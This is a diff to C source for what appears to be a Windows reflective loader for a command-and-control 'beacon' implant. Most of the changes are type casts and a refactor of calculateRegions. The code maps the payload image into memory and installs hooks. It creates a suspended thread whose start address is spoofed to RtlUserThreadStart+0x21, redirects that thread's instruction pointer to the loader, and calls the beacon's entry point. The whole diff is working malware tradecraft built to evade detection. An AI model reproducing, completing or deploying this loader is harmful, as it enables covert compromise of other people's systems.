@@ -38,7 +38,7 @@ typedef struct
 } REG, *PREG;
 
 #ifndef PTR_TO_HOOK
-#define PTR_TO_HOOK( a, b )    U_PTR( U_PTR( a ) + OFFSET( b ) - OFFSET( Stub ) )
+#define PTR_TO_HOOK( a, b )    C_PTR( U_PTR( a ) + OFFSET( b ) - OFFSET( Stub ) )
 #endif
 
 #ifndef memcpy
@@ -72,19 +72,18 @@ SECTION( B ) NTSTATUS resolveLoaderFunctions( PAPI pApi )
     return STATUS_SUCCESS;
 };
 
-SECTION( B ) REG calculateRegions( VOID )
+SECTION( B ) VOID calculateRegions( PREG pReg )
 {
-    REG         Reg = { 0 };
     SIZE_T      ILn = 0;   
 
-    Reg.Dos = C_PTR( G_END() );
-    Reg.NT  = C_PTR( U_PTR( Reg.Dos ) + Reg.Dos->e_lfanew );
+    pReg->Dos = C_PTR( G_END() );
+    pReg->NT  = C_PTR( U_PTR( pReg->Dos ) + pReg->Dos->e_lfanew );
 
-    ILn = ( ( ( Reg.NT->OptionalHeader.SizeOfImage ) + 0x1000 - 1 ) &~( 0x1000 - 1 ) );
-    Reg.Exec = ( ( ( G_END() - OFFSET( Stub ) ) + 0x1000 - 1 ) &~ ( 0x1000 - 1 ) );
-    Reg.Full = ILn + Reg.Exec;
-    
-    return Reg;
+    ILn = ( ( ( pReg->NT->OptionalHeader.SizeOfImage ) + 0x1000 - 1 ) &~( 0x1000 - 1 ) );
+    pReg->Exec = ( ( ( G_END() - OFFSET( Stub ) ) + 0x1000 - 1 ) &~ ( 0x1000 - 1 ) );
+    pReg->Full = ILn + pReg->Exec;
+
+    return;
 };
 
 SECTION( B ) VOID copyStub( PVOID buffer )
@@ -137,7 +136,7 @@ SECTION( B ) VOID installHooks( PVOID map, PVOID buffer, PIMAGE_NT_HEADERS nt )
 
     if( Dir->VirtualAddress )
     {
-        LdrProcessRel( C_PTR( map ), C_PTR( U_PTR( map ) + Dir->VirtualAddress ), nt->OptionalHeader.ImageBase );
+        LdrProcessRel( C_PTR( map ), C_PTR( U_PTR( map ) + Dir->VirtualAddress ), C_PTR( nt->OptionalHeader.ImageBase ) );
     };
 };
 
@@ -153,8 +152,8 @@ SECTION( B ) VOID fillStub( PVOID buffer, HANDLE heap, SIZE_T region )
 SECTION( B ) VOID executeBeacon( PVOID entry )
 {
     DLLMAIN_T Ent = entry;
-    Ent( OFFSET( Start ), 1, NULL );
-    Ent( OFFSET( Start ), 4, NULL );
+    Ent( ( HMODULE )OFFSET( Start ), 1, NULL );
+    Ent( ( HMODULE )OFFSET( Start ), 4, NULL );
 };
 
 SECTION( B ) VOID Loader( VOID ) 
@@ -172,7 +171,7 @@ SECTION( B ) VOID Loader( VOID )
 
     if( resolveLoaderFunctions( &Api ) == STATUS_SUCCESS )
     {
-        Reg = calculateRegions();
+        calculateRegions( &Reg );
         Status = Api.ntdll.NtAllocateVirtualMemory( ( HANDLE )-1, &MemoryBuffer, 0, &Reg.Full, MEM_COMMIT, PAGE_READWRITE );
         if( Status == STATUS_SUCCESS )
         {
@@ -226,16 +225,15 @@ SECTION( B ) NTSTATUS resolveAceFunctions( PAPI pApi )
 SECTION( B ) NTSTATUS createBeaconThread( PAPI pApi, PHANDLE thread )
 {
     BOOL Suspended = TRUE;
-    LPTHREAD_START_ROUTINE StartAddress = pApi->ntdll.RtlUserThreadStart + 0x21;
+    PVOID StartAddress = C_PTR( pApi->ntdll.RtlUserThreadStart + 0x21 );
 
-    return pApi->ntdll.RtlCreateUserThread( ( HANDLE )-1, NULL, Suspended, 0, 0, 0, StartAddress, NULL, thread, NULL );
+    return pApi->ntdll.RtlCreateUserThread( ( HANDLE )-1, NULL, Suspended, 0, 0, 0, ( PUSER_THREAD_START_ROUTINE )StartAddress, NULL, thread, NULL );
 };
 
 SECTION( B ) VOID Ace( VOID )
 {
     API         Api;
     CONTEXT     Ctx;
-    NTSTATUS    Status;
     HANDLE      Thread;
 
     RtlSecureZeroMemory( &Api, sizeof( Api ) );
@@ -247,7 +245,7 @@ SECTION( B ) VOID Ace( VOID )
         {
             Ctx.ContextFlags = CONTEXT_CONTROL;
             Api.ntdll.NtGetContextThread( Thread, &Ctx );
-            Ctx.Rip = C_PTR( Loader );
+            Ctx.Rip = ( DWORD64 )C_PTR( Loader );
 
             Api.ntdll.NtSetContextThread( Thread, &Ctx );
             Api.ntdll.NtResumeThread( Thread, NULL );
